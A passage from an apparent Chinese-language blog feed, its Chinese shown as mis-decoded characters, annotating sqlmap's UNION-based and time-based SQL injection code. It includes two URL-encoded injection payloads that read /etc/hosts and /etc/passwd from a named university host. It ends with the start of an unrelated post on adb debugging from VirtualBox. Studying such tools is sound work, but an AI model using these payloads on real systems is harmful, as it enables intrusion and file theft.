self.suffixQuery(inbandQuery, comment, suffix)<br><br>        <span class="hljs-keyword">return</span> inbandQuery<br><br>    topNumRegex = re.search(<span class="hljs-string">&quot;\ATOP\s+([\d]+)\s+&quot;</span>, query, re.I)<br>    <span class="hljs-keyword">if</span> topNumRegex:<br>        topNum = topNumRegex.group(<span class="hljs-number">1</span>)<br>        query = query[<span class="hljs-built_in">len</span>(<span class="hljs-string">&quot;TOP %s &quot;</span> % topNum):]<br>        inbandQuery += <span class="hljs-string">&quot;TOP %s &quot;</span> % topNum<br><br>    intoRegExp = re.search(<span class="hljs-string">&quot;(\s+INTO (DUMP|OUT)FILE\s+\&#x27;(.+?)\&#x27;)&quot;</span>, query, re.I)<br><br>    <span class="hljs-keyword">if</span> intoRegExp:<br>        intoRegExp = intoRegExp.group(<span class="hljs-number">1</span>)<br>        query = query[:query.index(intoRegExp)]<br><br>    <span class="hljs-keyword">if</span> Backend.getIdentifiedDbms() <span class="hljs-keyword">in</span> FROM_TABLE <span class="hljs-keyword">and</span> inbandQuery.endswith(FROM_TABLE[Backend.getIdentifiedDbms()]):<br>        inbandQuery = inbandQuery[:-<span class="hljs-built_in">len</span>(FROM_TABLE[Backend.getIdentifiedDbms()])]<br><br>    <span class="hljs-keyword">for</span> element <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">0</span>, count):<br>        <span class="hljs-keyword">if</span> element &gt; <span class="hljs-number">0</span>:<br>            inbandQuery += <span class="hljs-string">&quot;, &quot;</span><br><br>        <span class="hljs-keyword">if</span> element == position:<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot; FROM &quot;</span> <span class="hljs-keyword">in</span> query <span class="hljs-keyword">and</span> (<span class="hljs-string">&quot;(CASE &quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> query <span class="hljs-keyword">or</span> (<span class="hljs-string">&quot;(CASE &quot;</span> <span class="hljs-keyword">in</span> query <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;WHEN use&quot;</span> <span class="hljs-keyword">in</span> query)) <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;EXISTS(&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> query <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> query.startswith(<span class="hljs-string">&quot;SELECT &quot;</span>):<br>                conditionIndex = query.index(<span class="hljs-string">&quot; FROM &quot;</span>)<br>                inbandQuery += query[:conditionIndex]<br>            <span class="hljs-keyword">else</span>:<br>                inbandQuery += query<br>        <span class="hljs-keyword">else</span>:<br>            inbandQuery += char<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot; FROM &quot;</span> <span class="hljs-keyword">in</span> query <span class="hljs-keyword">and</span> (<span class="hljs-string">&quot;(CASE &quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> query <span class="hljs-keyword">or</span> (<span class="hljs-string">&quot;(CASE &quot;</span> <span class="hljs-keyword">in</span> query <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;WHEN use&quot;</span> <span class="hljs-keyword">in</span> query)) <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;EXISTS(&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> query <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> query.startswith(<span class="hljs-string">&quot;SELECT &quot;</span>):<br>        conditionIndex = query.index(<span class="hljs-string">&quot; FROM &quot;</span>)<br>        inbandQuery += query[conditionIndex:]<br><br>    <span class="hljs-keyword">if</span> Backend.getIdentifiedDbms() <span class="hljs-keyword">in</span> FROM_TABLE:<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot; FROM &quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> inbandQuery <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;(CASE &quot;</span> <span class="hljs-keyword">in</span> inbandQuery <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;(IIF&quot;</span> <span class="hljs-keyword">in</span> inbandQuery:<br>            inbandQuery += FROM_TABLE[Backend.getIdentifiedDbms()]<br><br>    <span class="hljs-keyword">if</span> intoRegExp:<br>        inbandQuery += intoRegExp<br><br>    <span class="hljs-keyword">if</span> multipleUnions:<br>        inbandQuery += <span class="hljs-string">&quot; UNION ALL SELECT &quot;</span><br><br>        <span class="hljs-keyword">for</span> element <span class="hljs-keyword">in</span> xrange(count):<br>            <span class="hljs-keyword">if</span> element &gt; <span class="hljs-number">0</span>:<br>                inbandQuery += <span class="hljs-string">&quot;, &quot;</span><br><br>            <span class="hljs-keyword">if</span> element == position:<br>                inbandQuery += multipleUnions<br>            <span class="hljs-keyword">else</span>:<br>                inbandQuery += char<br><br>        <span class="hljs-keyword">if</span> Backend.getIdentifiedDbms() <span class="hljs-keyword">in</span> FROM_TABLE:<br>            inbandQuery += FROM_TABLE[Backend.getIdentifiedDbms()]<br><br>    inbandQuery = self.suffixQuery(inbandQuery, comment, suffix)<br><br>    <span class="hljs-keyword">return</span> inbandQuery<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__findUnionCharCount</span>(<span class="hljs-params">comment, place, parameter, value, prefix, suffix, where=PAYLOAD.WHERE.ORIGINAL</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    Finds number of columns affected by UNION based injection</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    retVal = <span class="hljs-literal">None</span><br><br>    pushValue(kb.errorIsNone)<br>    items, ratios = [], []<br>    kb.errorIsNone = <span class="hljs-literal">False</span><br>    lowerCount, upperCount = conf.uColsStart, conf.uColsStop<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">abs</span>(upperCount - lowerCount) &lt; MIN_UNION_RESPONSES: <span class="hljs-comment"># MIN_UNION_RESPONSES = 5</span><br>        upperCount = lowerCount + MIN_UNION_RESPONSES<br><br>    min_, max_ = MAX_RATIO, MIN_RATIO <span class="hljs-comment"># MAX_RATIO = 1.0, MIN_RATIO = 0.0</span><br><br>    <span class="hljs-keyword">for</span> count <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(lowerCount, upperCount+<span class="hljs-number">1</span>):<br>        query = agent.forgeInbandQuery(<span class="hljs-string">&#x27;&#x27;</span>, -<span class="hljs-number">1</span>, count, comment, prefix, suffix, conf.uChar)<br>        payload = agent.payload(place=place, parameter=parameter, newValue=query, where=where)<br>        page, _ = Request.queryPage(payload, place=place, content=<span class="hljs-literal">True</span>, raise404=<span class="hljs-literal">False</span>)<br>        ratio = comparison(page, <span class="hljs-literal">True</span>) <span class="hljs-keyword">or</span> MIN_RATIO<br>        ratios.append(ratio)<br>        min_, max_ = <span class="hljs-built_in">min</span>(min_, ratio), <span class="hljs-built_in">max</span>(max_, ratio)<br>        items.append((count, ratio))<br><br>    ratios.pop(ratios.index(min_)) <span class="hljs-comment"># pop the min</span><br>    ratios.pop(ratios.index(max_)) <span class="hljs-comment"># pop the max</span><br> <br>    deviation = stdev(ratios) <span class="hljs-comment"># è®¡ç®—æ ‡å‡†åå·®</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">abs</span>(max_ - min_) &lt; MIN_STATISTICAL_RANGE: <span class="hljs-comment"># MIN_STATISTICAL_RANGE = 0.01</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>    <span class="hljs-comment"># UNION_STDEV_COEFF = 7</span><br>    lower, upper = average(ratios) - UNION_STDEV_COEFF * deviation, average(ratios) + UNION_STDEV_COEFF * deviation<br>    minItem, maxItem = <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span><br><br>    <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> items:<br>        <span class="hljs-keyword">if</span> item[<span class="hljs-number">1</span>] == min_:<br>            minItem = item<br>        <span class="hljs-keyword">elif</span> item[<span class="hljs-number">1</span>] == max_:<br>            maxItem = item<br><br>    <span class="hljs-keyword">if</span> min_ &lt; lower:<br>        retVal = minItem[<span class="hljs-number">0</span>]<br><br>    <span class="hljs-keyword">if</span> max_ &gt; upper:<br>        <span class="hljs-keyword">if</span> retVal <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">or</span> <span class="hljs-built_in">abs</span>(max_ - upper) &gt; <span class="hljs-built_in">abs</span>(min_ - lower):<br>            retVal = maxItem[<span class="hljs-number">0</span>]<br><br>    kb.errorIsNone = popValue()<br><br>    <span class="hljs-keyword">if</span> retVal:<br>        infoMsg = <span class="hljs-string">&quot;target url appears to be UNION injectable with %d columns&quot;</span> % retVal<br>        logger.info(infoMsg)<br><br>    <span class="hljs-keyword">return</span> retVal<br></code></pre></td></tr></table></figure><p>(3) æ ¹æ®ä¸åŒçš„æ•°æ®åº“åŠ ä¸Šå¿…è¦çš„from è¡¨å<br>(4) å†æ¬¡éªŒè¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">__unionPosition</span>(<span class="hljs-params">comment, place, parameter, value, prefix, suffix, count, where=PAYLOAD.WHERE.ORIGINAL</span>):<br>    validPayload = <span class="hljs-literal">None</span><br>    vector = <span class="hljs-literal">None</span><br><br>    positions = <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, count)<br><br>    <span class="hljs-comment"># Unbiased approach for searching appropriate usable column</span><br>    <span class="hljs-comment"># list ä¸­å…ƒç´ ä¹±åº</span><br>    random.shuffle(positions)<br><br>    <span class="hljs-comment"># For each column of the table (# of NULL) perform a request using</span><br>    <span class="hljs-comment"># the UNION ALL SELECT statement to test it the target url is</span><br>    <span class="hljs-comment"># affected by an exploitable inband SQL injection vulnerability</span><br>    <span class="hljs-comment"># æŸ¥æ‰¾å¯ä»¥æ˜¾ç¤ºçš„åˆ—</span><br>    <span class="hljs-keyword">for</span> position <span class="hljs-keyword">in</span> positions:<br>        <span class="hljs-comment"># Prepare expression with delimiters</span><br>        randQuery = randomStr(UNION_MIN_RESPONSE_CHARS) <span class="hljs-comment">#UNION_MIN_RESPONSE_CHARS = 10</span><br>        <span class="hljs-comment"># æ„é€ éšæœºå­—ç¬¦ä¸²åšæ ‡è®°</span><br>        phrase = <span class="hljs-string">&quot;%s%s%s&quot;</span>.lower() % (kb.misc.start, randQuery, kb.misc.stop) <br>        randQueryProcessed = agent.concatQuery(<span class="hljs-string">&quot;\&#x27;%s\&#x27;&quot;</span> % randQuery)<br>        <span class="hljs-keyword">import</span> logging<br>        logging.debug(<span class="hljs-string">&#x27;randQueryProcessed: %s&#x27;</span> % randQueryProcessed)<br>        randQueryUnescaped = unescaper.unescape(randQueryProcessed)<br><br>        <span class="hljs-comment"># Forge the inband SQL injection request</span><br>        <span class="hljs-comment"># æ„é€ UNION ALL SELECT æŸ¥è¯¢</span><br>        query = agent.forgeInbandQuery(randQueryUnescaped, position, count, comment, prefix, suffix, conf.uChar)<br>        payload = agent.payload(place=place, parameter=parameter, newValue=query, where=where)<br><br>        <span class="hljs-comment"># Perform the request</span><br>        page, headers = Request.queryPage(payload, place=place, content=<span class="hljs-literal">True</span>, raise404=<span class="hljs-literal">False</span>)<br>        <span class="hljs-comment"># ç§»é™¤åå°„çš„å†…å®¹</span><br>        content = <span class="hljs-string">&quot;%s%s&quot;</span>.lower() % (removeReflectiveValues(page, payload) <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;&quot;</span>, \<br>            removeReflectiveValues(listToStrValue(headers.headers <span class="hljs-keyword">if</span> headers <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span>), \<br>            payload, <span class="hljs-literal">True</span>) <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;&quot;</span>)<br><br>        <span class="hljs-keyword">if</span> content <span class="hljs-keyword">and</span> phrase <span class="hljs-keyword">in</span> content:<br>            validPayload = payload<br>            vector = (position, count, comment, prefix, suffix, conf.uChar, where)<br><br>            <span class="hljs-keyword">if</span> where == PAYLOAD.WHERE.ORIGINAL:<br>                <span class="hljs-comment"># Prepare expression with delimiters</span><br>                randQuery2 = randomStr(UNION_MIN_RESPONSE_CHARS) <span class="hljs-comment"># UNION_MIN_RESPONSE_CHARS = 10</span><br>                phrase2 = <span class="hljs-string">&quot;%s%s%s&quot;</span>.lower() % (kb.misc.start, randQuery2, kb.misc.stop)<br>                randQueryProcessed2 = agent.concatQuery(<span class="hljs-string">&quot;\&#x27;%s\&#x27;&quot;</span> % randQuery2)<br>                randQueryUnescaped2 = unescaper.unescape(randQueryProcessed2)<br><br>                <span class="hljs-comment"># Confirm that it is a full inband SQL injection</span><br>                query = agent.forgeInbandQuery(randQueryUnescaped, position, count, comment, prefix, suffix, conf.uChar, multipleUnions=randQueryUnescaped2)<br>                payload = agent.payload(place=place, parameter=parameter, newValue=query, where=PAYLOAD.WHERE.NEGATIVE)<br><br>                <span class="hljs-comment"># Perform the request</span><br>                page, headers = Request.queryPage(payload, place=place, content=<span class="hljs-literal">True</span>, raise404=<span class="hljs-literal">False</span>)<br>                content = <span class="hljs-string">&quot;%s%s&quot;</span>.lower() % (page <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;&quot;</span>, listToStrValue(headers.headers <span class="hljs-keyword">if</span> headers <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span>) <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;&quot;</span>)<br><br>                <span class="hljs-keyword">if</span> content <span class="hljs-keyword">and</span> ((phrase <span class="hljs-keyword">in</span> content <span class="hljs-keyword">and</span> phrase2 <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> content) <span class="hljs-keyword">or</span> (phrase <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> content <span class="hljs-keyword">and</span> phrase2 <span class="hljs-keyword">in</span> content)):<br>                    vector = (position, count, comment, prefix, suffix, conf.uChar, PAYLOAD.WHERE.NEGATIVE)<br><br>            <span class="hljs-keyword">break</span><br><br>    <span class="hljs-keyword">return</span> validPayload, vector<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://ipv6.tsinghua.edu.cn/end.php?ID=-<span class="hljs-number">3255</span>%<span class="hljs-number">20</span>UNION%<span class="hljs-number">20</span><span class="hljs-literal">ALL</span>%<span class="hljs-number">20</span>SELECT%<span class="hljs-number">20</span>NULL,%<span class="hljs-number">20</span>CONCAT%<span class="hljs-number">28</span>CHAR%<span class="hljs-number">2858</span>,<span class="hljs-number">107</span>,<span class="hljs-number">113</span>,<span class="hljs-number">117</span>,<span class="hljs-number">58</span>%<span class="hljs-number">29</span>,IFNULL%<span class="hljs-number">28</span>CAST%<span class="hljs-number">28</span>LOAD_FILE%<span class="hljs-number">28</span>CHAR%<span class="hljs-number">2847</span>,<span class="hljs-number">101</span>,<span class="hljs-number">116</span>,<span class="hljs-number">99</span>,<span class="hljs-number">47</span>,<span class="hljs-number">104</span>,<span class="hljs-number">111</span>,<span class="hljs-number">115</span>,<span class="hljs-number">116</span>,<span class="hljs-number">115</span>%<span class="hljs-number">29</span>%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>AS%<span class="hljs-number">20</span>CHAR%<span class="hljs-number">29</span>,CHAR%<span class="hljs-number">2832</span>%<span class="hljs-number">29</span>%<span class="hljs-number">29</span>,CHAR%<span class="hljs-number">2858</span>,<span class="hljs-number">101</span>,<span class="hljs-number">114</span>,<span class="hljs-number">112</span>,<span class="hljs-number">58</span>%<span class="hljs-number">29</span>%<span class="hljs-number">29</span>,%<span class="hljs-number">20</span>NULL,%<span class="hljs-number">20</span>NULL,%<span class="hljs-number">20</span>NULL,%<span class="hljs-number">20</span>NULL,%<span class="hljs-number">20</span>NULL#<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://ipv6.tsinghua.edu.cn/end.php?ID=-<span class="hljs-number">8675</span>%<span class="hljs-number">20</span>UNION%<span class="hljs-number">20</span><span class="hljs-literal">ALL</span>%<span class="hljs-number">20</span>SELECT%<span class="hljs-number">20</span>NULL,%<span class="hljs-number">20</span>CONCAT%<span class="hljs-number">28</span>CHAR%<span class="hljs-number">2858</span>,<span class="hljs-number">108</span>,<span class="hljs-number">100</span>,<span class="hljs-number">107</span>,<span class="hljs-number">58</span>%<span class="hljs-number">29</span>,IFNULL%<span class="hljs-number">28</span>CAST%<span class="hljs-number">28</span>LOAD_FILE%<span class="hljs-number">28</span>CHAR%<span class="hljs-number">2847</span>,<span class="hljs-number">101</span>,<span class="hljs-number">116</span>,<span class="hljs-number">99</span>,<span class="hljs-number">47</span>,<span class="hljs-number">112</span>,<span class="hljs-number">97</span>,<span class="hljs-number">115</span>,<span class="hljs-number">115</span>,<span class="hljs-number">119</span>,<span class="hljs-number">100</span>%<span class="hljs-number">29</span>%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>AS%<span class="hljs-number">20</span>CHAR%<span class="hljs-number">29</span>,CHAR%<span class="hljs-number">2832</span>%<span class="hljs-number">29</span>%<span class="hljs-number">29</span>,CHAR%<span class="hljs-number">2858</span>,<span class="hljs-number">111</span>,<span class="hljs-number">121</span>,<span class="hljs-number">105</span>,<span class="hljs-number">58</span>%<span class="hljs-number">29</span>%<span class="hljs-number">29</span>,%<span class="hljs-number">20</span>NULL,%<span class="hljs-number">20</span>NULL,%<span class="hljs-number">20</span>NULL,%<span class="hljs-number">20</span>NULL,%<span class="hljs-number">20</span>NULL#<br></code></pre></td></tr></table></figure><h3 id="åŸºäºå“åº”æ—¶é—´-time-based-blind-and-stacked-queries-SQL-injections"><a href="#åŸºäºå“åº”æ—¶é—´-time-based-blind-and-stacked-queries-SQL-injections" class="headerlink" title="åŸºäºå“åº”æ—¶é—´, time-based blind and stacked queries SQL injections"></a>åŸºäºå“åº”æ—¶é—´, time-based blind and stacked queries SQL injections</h3><p>åˆ¤æ–­æ˜¯å¦delayï¼Œåœ¨ lib&#x2F;core&#x2F;common.py ä¸­wasLastRequestDelayed å®ç°æ ¹æ®ç»Ÿè®¡ç»“æœï¼Œsqlmap æ³¨é‡Š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">wasLastRequestDelayed</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    Returns True if the last web request resulted in a time-delay</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><br>    <span class="hljs-comment"># 99.9999999997440% of all non time-based sql injection affected</span><br>    <span class="hljs-comment"># response times should be inside +-7*stdev([normal response times])</span><br>    <span class="hljs-comment"># Math reference: http://www.answers.com/topic/standard-deviation</span><br>    deviation = stdev(kb.responseTimes) <span class="hljs-comment"># è®¡ç®—æ‰€æœ‰å“åº”æ—¶é—´çš„æ ‡å‡†åå·®</span><br>    threadData = getCurrentThreadData()<br><br>    <span class="hljs-keyword">if</span> deviation:<br>        <span class="hljs-comment"># éœ€è¦ä¸€å®šæ•°æ®é‡ï¼Œç»Ÿè®¡ç»“æœæ‰æœ‰æ„ä¹‰</span><br>        <span class="hljs-comment"># MIN_TIME_RESPONSES = 10</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(kb.responseTimes) &lt; MIN_TIME_RESPONSES: <br>            warnMsg = <span class="hljs-string">&quot;time-based standard deviation method used on a model &quot;</span><br>            warnMsg += <span class="hljs-string">&quot;with less than %d response times&quot;</span> % MIN_TIME_RESPONSES<br>            logger.warn(warnMsg)<br><br>        <span class="hljs-comment"># TIME_STDEV_COEFF = 10 å¿…é¡»å¤§äºç­‰äº7</span><br>        lowerStdLimit = average(kb.responseTimes) + TIME_STDEV_COEFF * deviation<br>        retVal = (threadData.lastQueryDuration &gt;= lowerStdLimit)<br><br>        <span class="hljs-comment"># å¦‚æœretVal ä¸ºTrueï¼Œ å‘ç”ŸDelayï¼Œéœ€è¦è°ƒæ•´</span><br>        <span class="hljs-comment"># TIME_DEFAULT_DELAY = 5, kb.testMode sql injection test mode,</span><br>        <span class="hljs-comment"># ç”¨æˆ·æ²¡ç”¨æ‰‹åŠ¨æ›´æ”¹Delay æ—¶é—´</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> kb.testMode <span class="hljs-keyword">and</span> retVal <span class="hljs-keyword">and</span> conf.timeSec == TIME_DEFAULT_DELAY:<br>            adjustTimeDelay(threadData.lastQueryDuration, lowerStdLimit)<br><br>        <span class="hljs-keyword">return</span> retVal<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> (threadData.lastQueryDuration - conf.timeSec) &gt;= <span class="hljs-number">0</span><br><br><br><span class="hljs-comment"># length of queue for candidates for time delay adjustment</span><br>TIME_DELAY_CANDIDATES = <span class="hljs-number">3</span><br>kb.delayCandidates = TIME_DELAY_CANDIDATES * [<span class="hljs-number">0</span>]<br>kb.delayCandidates = [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">adjustTimeDelay</span>(<span class="hljs-params">lastQueryDuration, lowerStdLimit</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    Adjusts time delay in time-based data retrieval</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><br>    candidate = <span class="hljs-number">1</span> + <span class="hljs-built_in">int</span>(<span class="hljs-built_in">round</span>((<span class="hljs-number">1</span> - (lastQueryDuration - lowerStdLimit) / lastQueryDuration) * conf.timeSec))<br><br>    <span class="hljs-keyword">if</span> candidate:<br>        kb.delayCandidates = [candidate] + kb.delayCandidates[:-<span class="hljs-number">1</span>]<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">all</span>([x == candidate <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> kb.delayCandidates]) <span class="hljs-keyword">and</span> candidate &lt; conf.timeSec:<br>            <span class="hljs-built_in">print</span><br><br>            warnMsg = <span class="hljs-string">&quot;adjusting time delay to %d second%s &quot;</span> % (candidate, <span class="hljs-string">&#x27;s&#x27;</span> <span class="hljs-keyword">if</span> candidate &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;&#x27;</span>)<br>            warnMsg += <span class="hljs-string">&quot;(due to good response times)&quot;</span><br>            logger.warn(warnMsg)<br><br>            conf.timeSec = candidate<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>åœ¨è™šæ‹Ÿæœºä¸­è°ƒè¯•android æ‰‹æœºçš„æ–¹æ³•</title>
    <link href="/cn/android_emulator_debug/"/>
    <url>/cn/android_emulator_debug/</url>
    
    <content type="html"><![CDATA[<p>ç”±äºGoogleçš„æºç æ˜¯åœ¨ubuntuä¸‹ç¼–è¯‘çš„ï¼ŒGoogleå®˜æ–¹æä¾›äº†è¾ƒä¸ºè¯¦ç»†çš„ç¼–è¯‘è¯´æ˜ï¼Œæ‰€ä»¥ä½¿ç”¨ äº†ubuntu 14.04 è¿›è¡Œç¼–è¯‘ï¼Œç¼–è¯‘å®Œæˆåæœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå¦‚ä½•è¿›è¡Œæºç è°ƒè¯•ã€‚ï¼ˆæºä»£ç åœ¨è™šæ‹Ÿæœºä¸­ï¼‰</p><h2 id="ä½¿ç”¨-virutalbox-Extension-Pack"><a href="#ä½¿ç”¨-virutalbox-Extension-Pack" class="headerlink" title="ä½¿ç”¨ virutalbox Extension Pack"></a>ä½¿ç”¨ virutalbox Extension Pack</h2><p>é¦–å…ˆçš„æƒ³æ³•æ˜¯ç›´æ¥ä½¿ç”¨ä¸­virutalBox çš„USB æŠŠæ‰‹æœºç»™è¿åˆ°guestï¼ŒæŠ˜è…¾äº†ä¸€ä¸‹æ¯”è¾ƒéº»çƒ¦ï¼Œ é¦–å…ˆéœ€è¦å®‰è£…virutalbox çš„ Extension Packï¼Œä¸‹è½½åœ°å€</p><p><a href="http://download.virtualbox.org/virtualbox/5.1.18/Oracle_VM_VirtualBox_Extension_Pack-5.1.18-114002.vbox-extpack">http://download.virtualbox.org/virtualbox/5.1.18/Oracle_VM_VirtualBox_Extension_Pack-5.1.18-114002.vbox-extpack</a></p><p>ç®¡ç†-&gt;å…¨å±€è®¾å®š-&gt;æ‰©å±•ï¼Œé€‰æ‹©ä¸‹è½½çš„æ‰©å±•åŒ…ï¼Œå®‰è£…ã€‚æ¥ä¸‹æ¥è¿™æ­¥å¾ˆå…³é”®ï¼Œä¸Šæ¬¡å°±æ˜¯è¿™é‡Œæ²¡æœ‰æå®šã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo usermod -a -G vboxusers &lt;username&gt;<br></code></pre></td></tr></table></figure><p>æ‰§è¡Œå‘½ä»¤åéœ€è¦æ³¨é”€ï¼Œé‡æ–°ç™»å½•ã€‚</p><p>VirtualBox è™šæ‹Ÿæœºè®¾ç½® -&gt; usb æ·»åŠ éœ€è¦æ¥å…¥ guest çš„ usb è®¾å¤‡ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt; lsudo lsusb  <br>Bus 001 Device 002: ID 18d1:4ee7 Google Inc.<br>Bus 001 Device 001: ID 1d6b:0002 Linux Foundation 2.0 root hub<br>Bus 002 Device 002: ID 80ee:0021 VirtualBox USB Tablet<br>Bus 002 Device 001: ID 1d6b:0001 Linux Foundation 1.1 root hub<br></code></pre></td></tr></table></figure><h2 id="ä½¿ç”¨ç«¯å£æ˜ å°„"><a href="#ä½¿ç”¨ç«¯å£æ˜ å°„" class="headerlink" title="ä½¿ç”¨ç«¯å£æ˜ å°„"></a>ä½¿ç”¨ç«¯å£æ˜ å°„</h2><p>åé¢æƒ³åˆ°adb å…¶å®æ˜¯é€šè¿‡tcp å’ŒAndroidè®¾å¤‡é€šè®¯ï¼Œ æ‰€ä»¥åªè¦åšç«¯å£æ˜ å°„æ‰“ä¸ªé€šé“ï¼Œå°±å¯ä»¥è§£å†³åœ¨virutalBoxçš„è™šæ‹Ÿæœºé‡Œè°ƒè¯•æ‰‹æœºçš„é—®é¢˜ã€‚</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">tcp</span>        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">127.0.0.1:5037</span>          <span class="hljs-number">0.0.0.0</span>:*               LISTEN      <span class="hljs-number">26706</span>/adb 